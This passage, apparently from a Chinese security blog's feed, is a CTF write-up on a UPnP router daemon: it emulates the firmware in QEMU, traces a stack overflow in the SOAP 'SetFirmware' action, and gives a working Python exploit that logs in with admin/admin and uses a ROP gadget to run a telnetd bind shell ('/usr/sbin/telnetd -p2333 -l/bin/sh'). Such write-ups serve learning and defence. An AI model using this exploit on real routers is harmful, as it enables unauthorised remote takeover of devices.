class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v58 <span class="token punctuation">)</span>    <span class="token keyword">goto</span> LABEL_836<span class="token punctuation">;</span>a3 <span class="token operator">=</span> <span class="token function">stristr</span><span class="token punctuation">(</span>v58<span class="token punctuation">,</span> <span class="token string">"&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>a3 <span class="token punctuation">)</span>    <span class="token keyword">goto</span> LABEL_836<span class="token punctuation">;</span>v59 <span class="token operator">=</span> <span class="token function">stristr</span><span class="token punctuation">(</span>http_v7<span class="token punctuation">,</span> <span class="token string">"&lt;/Password&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v59 <span class="token punctuation">)</span>    <span class="token keyword">goto</span> LABEL_836<span class="token punctuation">;</span><span class="token operator">*</span>v59 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>v77 <span class="token operator">=</span> v59<span class="token punctuation">;</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>v82 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v83<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x7Cu</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">doHash</span><span class="token punctuation">(</span>a3 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> v82<span class="token punctuation">,</span> a3<span class="token punctuation">,</span> v60<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// passwd stored in SHA256 format</span>v61 <span class="token operator">=</span> <span class="token function">acosNvramConfig_match</span><span class="token punctuation">(</span><span class="token string">"http_passwd_digest"</span><span class="token punctuation">,</span> v82<span class="token punctuation">)</span><span class="token punctuation">;</span>v62 <span class="token operator">=</span> v61 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> v61 <span class="token punctuation">)</span>    v62 <span class="token operator">=</span> v55 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">*</span>v77 <span class="token operator">=</span> <span class="token number">60</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v62 <span class="token punctuation">)</span>                         <span class="token comment">// account right</span><span class="token punctuation">{</span>    <span class="token function">sub_31CDC</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v99<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">in_addr_t</span><span class="token punctuation">)</span>in_addr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// generate cookie</span>    v63 <span class="token operator">=</span> <span class="token function">sub_32014</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v99<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>in_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v63 <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token punctuation">)</span>        v63 <span class="token operator">=</span> <span class="token number">503</span><span class="token punctuation">;</span>    resp_state <span class="token operator">=</span> v63<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>需要在发送的http包中指定<code>&lt;Username&gt;Name&lt;/Username&gt;</code>，<code>&lt;Password&gt;Passwd&lt;/Password&gt;</code>，登录成功后将session_ID在响应包中发送。在模拟启动环境发送登录包将获得如下响应包：</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20230418/image-20230313133704656.643pkn0mof80.webp"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">SOAPLogin</span><span class="token punctuation">(</span>http_username<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> passwd<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">str</span><span class="token punctuation">:</span>    header <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">"SOAPACTION"</span><span class="token punctuation">:</span> <span class="token string">"urn:NETGEAR-ROUTER:service:DeviceConfig:1#SOAPLogin"</span>    <span class="token punctuation">}</span>    body <span class="token operator">=</span> <span class="token string">'&lt;?xml version="1.0"?&gt;\r\n'</span>    body <span class="token operator">+=</span> <span class="token string">'&lt;Username&gt;admin&lt;/Username&gt;\r\n'</span>    body <span class="token operator">+=</span> <span class="token string">'&lt;Password&gt;admin&lt;/Password&gt;\r\n'</span>    respnd <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>URL<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">,</span> data<span class="token operator">=</span>body<span class="token punctuation">)</span>    cookie <span class="token operator">=</span> respnd<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'Set-Cookie'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>cookie<span class="token punctuation">)</span>    <span class="token keyword">return</span> cookie<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="模拟启动"><a href="#模拟启动" class="headerlink" title="模拟启动"></a>模拟启动</h2><p>qemu配置如下：<a href="https://people.debian.org/~aurel32/qemu/armhf/">Index of /~aurel32/qemu/armhf (debian.org)</a></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>qemu-system-arm -M vexpress-a9 <span class="token punctuation">\</span>-kernel vmlinuz-3.2.0-4-vexpress <span class="token punctuation">\</span>-initrd initrd.img-3.2.0-4-vexpress <span class="token punctuation">\</span>-drive <span class="token assign-left variable">if</span><span class="token operator">=</span>sd,file<span class="token operator">=</span>debian_wheezy_armhf_standard.qcow2<span class="token punctuation">\</span>-append <span class="token string">"root=/dev/mmcblk0p2 console=ttyAMA0"</span> <span class="token punctuation">\</span>-net user,hostfwd<span class="token operator">=</span>tcp::2222-:22,hostfwd<span class="token operator">=</span>tcp::5555-:5555,hostfwd<span class="token operator">=</span>tcp::5000-:5000 -net nic <span class="token punctuation">\</span>-nographic<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因为程序中大量调用nvram的系列函数，所以使用<a href="https://github.com/grimm-co/NotQuite0DayFriday.git%E6%8F%90%E4%BE%9B%E7%9A%84hook%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E4%B8%80%E4%B8%AAhook%E5%BA%93(%E6%A0%B9%E6%8D%AEIDA%E5%8F%AF%E7%9F%A5nvram%E5%87%BD%E6%95%B0%E7%9A%84%E5%AE%9E%E7%8E%B0%E5%9C%A8%60libnvram.so%60%E4%B8%AD)%EF%BC%8C%E7%84%B6%E5%90%8E%E4%BC%A0%E5%85%A5qemu%E4%B8%AD%E6%9B%BF%E6%8D%A2%60usr/lib/libnvram.so%60%E3%80%82%E5%B0%9D%E8%AF%95%E5%90%AF%E5%8A%A8%E7%BB%93%E6%9E%9C%E5%A6%82%E4%B8%8B">https://github.com/grimm-co/NotQuite0DayFriday.git提供的hook源码编译一个hook库(根据IDA可知nvram函数的实现在`libnvram.so`中)，然后传入qemu中替换`usr/lib/libnvram.so`。尝试启动结果如下</a></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@debian-armhf:~<span class="token comment"># cd squashfs-root/</span>root@debian-armhf:~/squashfs-root<span class="token comment"># mount --bind /proc ./proc</span>root@debian-armhf:~/squashfs-root<span class="token comment"># mount --bind /dev ./dev/</span>root@debian-armhf:~/squashfs-root<span class="token comment"># chroot . ./bin/busybox sh</span>BusyBox v1.7.2 <span class="token punctuation">(</span><span class="token number">2021</span>-08-26 <span class="token number">10</span>:32:44 CST<span class="token punctuation">)</span> built-in shell <span class="token punctuation">(</span>ash<span class="token punctuation">)</span>Enter <span class="token string">'help'</span> <span class="token keyword">for</span> a list of built-in commands.<span class="token comment">#/usr/sbin/upnpd</span>Getting upnp_turn_onGetting upnp_turn_onGetting lan_ipaddrGetting upnp_turn_onGetting upnp_turn_onGetting friendly_nameGetting upnp_turn_onGetting friendly_nameGetting upnp_turn_onGetting hw_revGetting upnp_turn_onGetting friendly_nameGetting upnp_turn_onGetting upnp_turn_onopen: No such <span class="token function">file</span> or directoryGetting upnp_turn_onGetting lan_hwaddrGetting lan_hwaddrGetting upnp_turn_onGetting lan_ipaddrGetting upnp_turn_onGetting friendly_nameGetting upnp_turn_onGetting hw_revGetting upnp_turn_onGetting friendly_nameGetting upnp_turn_onGetting upnp_turn_onopen: No such <span class="token function">file</span> or directoryGetting upnp_turn_onGetting lan_hwaddrGetting lan_hwaddrGetting upnp_turn_onGetting lan_ipaddrGetting upnp_turn_onGetting friendly_nameGetting upnp_turn_onGetting hw_revGetting upnp_turn_onGetting friendly_nameGetting upnp_turn_onGetting upnp_turn_onopen: No such <span class="token function">file</span> or directoryGetting upnp_turn_onGetting lan_hwaddrGetting lan_hwaddrGetting upnp_turn_onGetting lan_ipaddrGetting upnp_durationGetting upnp_durationGetting upnp_durationGetting upnp_durationGetting upnp_durationGetting upnp_durationGetting upnp_durationGetting upnp_durationSetting upnp_portmap_entry <span class="token operator">=</span> <span class="token number">0</span>Getting upnp_turn_onGetting lan_ipaddrGetting lan_ipaddr<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>程序在main函数中调用了<code>daemon</code>进入后台，所以不方便直接gdb调试，因此为了后面分析这里需要<code>NOP</code>掉；然后就是直接运行发现后面立马<code>exit(0)</code>。nop掉daemon后进去调试发现在调用<code>setsockopt(v5, 0, 35, &amp;optval, 8u)</code><strong>加入多播地址出错</strong>：</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20230418/image-20230310110201657.1ezkyyc9sj4w.webp"></p><p>google了一下这个问题发现是qemu自身不支持多播协议：</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20230418/image-20230310110347986.5xdhln13uts0.webp"></p><p>但是这里关键在于upnp程序的控制服务和多播功能关系不大，因此选择将修改下面的跳转为无条件跳转：</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20230418/image-20230310110538896.by7epj96oyo.webp"></p><p>然后就可以维持运行了：</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20230418/image-20230310110647617.44p7iyns4u00.webp"></p><p>需要的就是这两个端口</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>与login的action调用类似，固件更新的action名为<code>SetFirmware</code>，同样属于<code>DeviceConfig</code>服务下标为60，主要逻辑如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">  v130 <span class="token operator">=</span> v7 <span class="token operator">==</span> <span class="token number">0xFF13</span><span class="token punctuation">;</span>  dword_EC044<span class="token punctuation">[</span><span class="token number">19</span> <span class="token operator">*</span> v83<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xFF3B</span><span class="token punctuation">;</span>  firmdataDecry <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x400000u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v24 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8 <span class="token operator">*</span><span class="token punctuation">)</span>firmdataDecry<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>firmdataDecry <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    v2 <span class="token operator">=</span> <span class="token number">603</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"No memory buffer %d for using in %s\n"</span><span class="token punctuation">,</span> <span class="token number">0x400000</span><span class="token punctuation">,</span> <span class="token string">"sa_setFirmware"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">goto</span> LABEL_101<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">base64Decode</span><span class="token punctuation">(</span>firmdataDecry<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v130<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8 <span class="token operator">*</span><span class="token punctuation">)</span>firmdataCry<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"sa_base64_decode, len=%d\n"</span><span class="token punctuation">,</span> v130<span class="token punctuation">)</span><span class="token punctuation">;</span>  v25 <span class="token operator">=</span> v24<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"SOAP firmware upgrade checking ... "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">checker</span><span class="token punctuation">(</span>v24<span class="token punctuation">)</span> <span class="token punctuation">)</span>                           <span class="token comment">// stack overflow</span>  <span class="token punctuation">{</span>    v2 <span class="token operator">=</span> <span class="token number">702</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token comment">/*checker part*/</span>    v4 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8 <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token number">38</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v5 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8 <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v6 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8 <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token number">37</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v7 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8 <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8 <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8 <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v8 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8 <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token number">39</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8 <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token number">36</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token number">36</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token number">37</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    len <span class="token operator">=</span> v7 <span class="token operator">+</span> <span class="token punctuation">(</span>v5 <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token number">38</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token number">39</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    v10 <span class="token operator">=</span> v8 <span class="token operator">+</span> <span class="token punctuation">(</span>v4 <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>v6 <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v13<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x64u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v13<span class="token punctuation">,</span> v1<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">calculate_checksum</span><span class="token punctuation">(</span>v3<span class="token punctuation">,</span> v3<span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/*.data:000841C8 ; specialArg ArgList[].data:000841C8 ArgList         DCD 0xFF00              ; DATA XREF: sub_F39C+28↑o.data:000841C8                                         ; sub_F39C+60↑o ....data:000841CC off_841CC       DCD aNewenable          ; DATA XREF: firmStuff+58↑r.data:000841CC                                         ; "NewEnable".data:000841D0 dword_841D0     DCD 1                   ; DATA XREF: firmStuff+60↑r.data:000841D4                 DCD 0xFF01.data:000841D8 off_841D8       DCD aNewconnectiont     ; DATA XREF: firmStuff+2DC↑r.data:000841D8                                         ; "NewConnectionType".data:000841DC dword_841DC     DCD 0x10                ; DATA XREF: firmStuff+2E4↑r.data:000841E0                 DCD 0xFF02.data:000841E4                 DCD 0x4AB1C.data:000841E8                 DCD 0x40*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以在参数列表中找到该action的参数label为<code>&lt;NewFirmware&gt;FirmData&lt;/NewFirmware&gt;</code>；其中发送的firmData是base64加密过的，这里在构造firmware数据时注意<strong>不要造成memcpy的len太大</strong>否则在memcpy就可能出现段错误，但无法利用(这中copy函数的长度问题在iot中经常遇到)。构造包溢出后结果如下：<img src="README.assets/image-20230313144816503.png" alt="image-20230313144816503"></p><p>得到偏移如下：</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20230418/image-20230313144943910.71ixuw0w6dc0.webp"></p><p>因为开启了NX保护所以rop构造system(cmd)，在arm架构下控制r0~r3的gadgets很少，但是在程序中调用system函数的附近找到如下指令：</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">2F134                 MOV             R0, SP  ; command2F138                 BL              system<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>那么就可以在176偏移处存放cmd，然后168处存放2F134地址即可。Exp如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token punctuation">,</span> base64<span class="token punctuation">,</span> requests<span class="token punctuation">,</span> structURL <span class="token operator">=</span> <span class="token string">'http://localhost:5000/soap/server_sa'</span><span class="token keyword">def</span> <span class="token function">SOAPLogin</span><span class="token punctuation">(</span>http_username<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> passwd<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">str</span><span class="token punctuation">:</span>    header <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">"SOAPACTION"</span><span class="token punctuation">:</span> <span class="token string">"urn:NETGEAR-ROUTER:service:DeviceConfig:1#SOAPLogin"</span>    <span class="token punctuation">}</span>    body <span class="token operator">=</span> <span class="token string">'&lt;?xml version="1.0"?&gt;\r\n'</span>    body <span class="token operator">+=</span> <span class="token string">'&lt;Username&gt;admin&lt;/Username&gt;\r\n'</span>    body <span class="token operator">+=</span> <span class="token string">'&lt;Password&gt;admin&lt;/Password&gt;\r\n'</span>    respnd <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>URL<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">,</span> data<span class="token operator">=</span>body<span class="token punctuation">)</span>    cookie <span class="token operator">=</span> respnd<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'Set-Cookie'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>cookie<span class="token punctuation">)</span>    <span class="token keyword">return</span> cookie<span class="token keyword">def</span> <span class="token function">SetFirmware</span><span class="token punctuation">(</span>cookie<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    header <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">"SOAPACTION"</span><span class="token punctuation">:</span> <span class="token string">"urn:NETGEAR-ROUTER:service:DeviceConfig:1#SetFirmware"</span><span class="token punctuation">,</span>        <span class="token string">"Cookie"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">{</span>cookie<span class="token punctuation">}</span></span><span class="token string">'</span></span>    <span class="token punctuation">}</span>    firmData <span class="token operator">=</span> <span class="token string">b'*#$^'</span> <span class="token operator">+</span> <span class="token string">b'\x00'</span> <span class="token operator">+</span> <span class="token string">b'\x00'</span> <span class="token operator">+</span> <span class="token string">b'\x01'</span> <span class="token operator">+</span> <span class="token string">b'\x00'</span>    firmData <span class="token operator">+=</span> <span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">144</span>    firmData <span class="token operator">+=</span> <span class="token string">b'4'</span><span class="token operator">*</span><span class="token number">4</span>      <span class="token comment">#r4</span>    firmData <span class="token operator">+=</span> <span class="token string">b'5'</span><span class="token operator">*</span><span class="token number">4</span>      <span class="token comment">#r5</span>    firmData <span class="token operator">+=</span> <span class="token string">b'6'</span><span class="token operator">*</span><span class="token number">4</span>      <span class="token comment">#r6</span>    firmData <span class="token operator">+=</span> <span class="token string">b'7'</span><span class="token operator">*</span><span class="token number">4</span>      <span class="token comment">#r7</span>    firmData <span class="token operator">+=</span> <span class="token string">b'8'</span><span class="token operator">*</span><span class="token number">4</span>      <span class="token comment">#r8</span>    firmData <span class="token operator">+=</span> <span class="token string">b'9'</span><span class="token operator">*</span><span class="token number">4</span>      <span class="token comment">#r9</span>    firmData <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">4</span>      <span class="token comment">#r10</span>    <span class="token triple-quoted-string string">"""ROP for system(ANY_cmd)    2F134                 MOV             R0, SP  ; command    2F138                 BL              system    """</span>    firmData <span class="token operator">+=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x2F134</span><span class="token punctuation">)</span>      <span class="token comment">#PC</span>    firmData <span class="token operator">+=</span> <span class="token string">b'/usr/sbin/telnetd -p2333 -l/bin/sh &amp;'</span>    body <span class="token operator">=</span> <span class="token string">b''</span>    body <span class="token operator">+=</span> <span class="token string">b'&lt;s:Body&gt;\r\n'</span>    body <span class="token operator">+=</span> <span class="token string">b'&lt;NewFirmware&gt;%s'</span><span class="token operator">%</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>firmData<span class="token punctuation">)</span><span class="token punctuation">)</span>    body <span class="token operator">+=</span> <span class="token string">b'&lt;/NewFirmware&gt;'</span>    body <span class="token operator">+=</span> <span class="token string">b'&lt;/s:Body&gt;\r\n'</span>        respn <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>URL<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">,</span> data<span class="token operator">=</span>body<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>respn<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    cookie <span class="token operator">=</span> SOAPLogin<span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span> <span class="token string">'admin'</span><span class="token punctuation">)</span>    SetFirmware<span class="token punctuation">(</span>cookie<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>先了解一个程序的服务架构方便定位其易出问题的地方</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://blog.grimm-co.com/2022/04/no-hardware-no-problem-emulation-and.html">No Hardware, No Problem: Emulation and Exploitation (grimm-co.com)</a></li><li><a href="https://people.debian.org/~aurel32/qemu/armhf/">Index of /~aurel32/qemu/armhf (debian.org)</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;西湖论剑WriteUP-Upnp&quot;&gt;&lt;a href=&quot;#西湖论剑WriteUP-Upnp&quot; class=&quot;headerlink&quot; title=&quot;西湖论剑WriteUP - Upnp&quot;&gt;&lt;/a&gt;西湖论剑WriteUP - Upnp&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="CTF" scheme="https://rainsec.cn/categories/CTF/"/>
    
    
    <category term="CTF" scheme="https://rainsec.cn/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu 更新内核到指定版本</title>
    <link href="https://rainsec.cn/post/Ubuntu20.04%20%E5%8D%87%E7%BA%A7%E9%99%8D%E7%BA%A7%E5%86%85%E6%A0%B8%E5%88%B0%E6%8C%87%E5%AE%9A%E7%89%88%E6%9C%AC.html"/>
